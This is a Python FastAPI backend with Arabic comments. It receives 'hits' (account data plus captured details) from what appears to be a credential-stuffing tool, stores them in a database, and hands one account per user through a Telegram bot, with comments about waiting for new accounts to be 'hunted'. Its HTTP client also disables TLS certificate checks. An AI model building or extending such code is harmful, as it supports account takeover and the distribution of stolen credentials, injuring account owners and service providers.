from fastapi import FastAPI, Request
import httpx
import os
from sqlalchemy import create_engine, Column, Integer, String, Boolean
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

app = FastAPI()

# --- إعدادات البيئة ---
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
# رابط قاعدة البيانات من ريندر (نقوم باستبدال postgres:// بـ postgresql:// للتوافق)
DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# --- إعدادات قاعدة البيانات (SQLAlchemy) ---
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# 1. جدول الحسابات المخزنة
class Account(Base):
    __tablename__ = "accounts"
    
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True) # unique لمنع تكرار نفس الحساب
    captured_data = Column(String)
    is_given = Column(Boolean, default=False) # هل تم تسليمه لمستخدم؟

# 2. جدول لتسجيل المستخدمين الذين استلموا حسابات (لمنع التكرار)
class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True) # تضمن أن المستخدم يظهر هنا مرة واحدة فقط

# إنشاء الجداول في قاعدة البيانات عند تشغيل التطبيق
Base.metadata.create_all(bind=engine)

@app.get("/")
def read_root():
    return {"status": "Database & Bot Bridge is running successfully"}

# --- استقبال الحسابات وتخزينها ---
@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()
        
        config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "Unknown Config"
        account_data = data.get("data", "No Data")
        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "No Captured Data"
        
        # التحقق مما إذا كان الحساب موجوداً مسبقاً في القاعدة لمنع التكرار
        exists = db.query(Account).filter(Account.account_data == account_data).first()
        if exists:
            return {"status": "ignored", "message": "Account already exists"}
            
        # حفظ الحساب الجديد في قاعدة البيانات كـ "غير موزع" (is_given=False)
        new_account = Account(
            config_name=config_name,
            account_data=account_data,
            captured_data=captured_data,
            is_given=False
        )
        db.add(new_account)
        db.commit()
        
        return {"status": "success", "message": "Account saved to Render DB"}
        
    except Exception as e:
        db.rollback()
        print(f"Error saving hit: {str(e)}")
        return {"status": "error", "message": str(e)}
    finally:
        db.close()

# --- معالجة طلبات بوت تليجرام ---
@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()
        
        # التأكد من أن القادم هو رسالة نصية
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}
            
        chat_id = str(payload["message"]["chat"]["id"])
        user_text = payload["message"]["text"].strip()
        
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        
        # الأمر الأول: فحص الإحصائيات المتوفرة
        if user_text == "/stats" or user_text == "المتوفر":
            # حساب عدد الحسابات غير الموزعة
            available_count = db.query(Account).filter(Account.is_given == False).count()
            reply_text = f"📊 الحسابات المتوفرة حالياً في المخزن: {available_count}"
            
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(telegram_url, json={"chat_id": chat_id, "text": reply_text})
                
        # الأمر الثاني: طلب حساب (توزيع حساب واحد لكل شخص)
        elif user_text == "/get" or user_text == "اريد حساب":
            # 1. التحقق أولاً إن كان هذا المستخدم قد أخذ حساباً من قبل
            already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
            
            if already_received:
                reply_text = "❌ عذراً! لقد قمت باستلام حسابك بالفعل سابقاً. مسموح بحساب واحد فقط لكل مستخدم."
            else:
                # 2. جلب أول حساب متوفر وغير موزع
                available_account = db.query(Account).filter(Account.is_given == False).first()
                
                if not available_account:
                    reply_text = "😔 نأسف، لا توجد حسابات متوفرة حالياً في المخزن. انتظر حتى يتم صيد حسابات جديدة!"
                else:
                    # 3. تحديث حالة الحساب وتثبيت أن المستخدم أخذ حصته
                    available_account.is_given = True
                    user_claim = DeliveredAccount(user_id=chat_id)
                    db.add(user_claim)
                    db.commit()
                    
                    # صياغة رسالة الحساب للمستخدم
                    reply_text = (
                        f"🎉 إليك حسابك الخاص:\n\n"
                        f"Config: {available_account.config_name}\n"
                        f"Account: {available_account.account_data}\n"
                        f"Captured: {available_account.captured_data}\n\n"
                        f"⚠️ تذكر: لا يمكنك طلب حساب آخر."
                    )
                    
            async with httpx.AsyncClient(verify=False) as client:
                await client.post(telegram_url, json={"chat_id": chat_id, "text": reply_text})
                
        return {"status": "success"}
        
    except Exception as e:
        db.rollback()
        print(f"Telegram Webhook Error: {str(e)}")
        return {"status": "error"}
    finally:
        db.close()
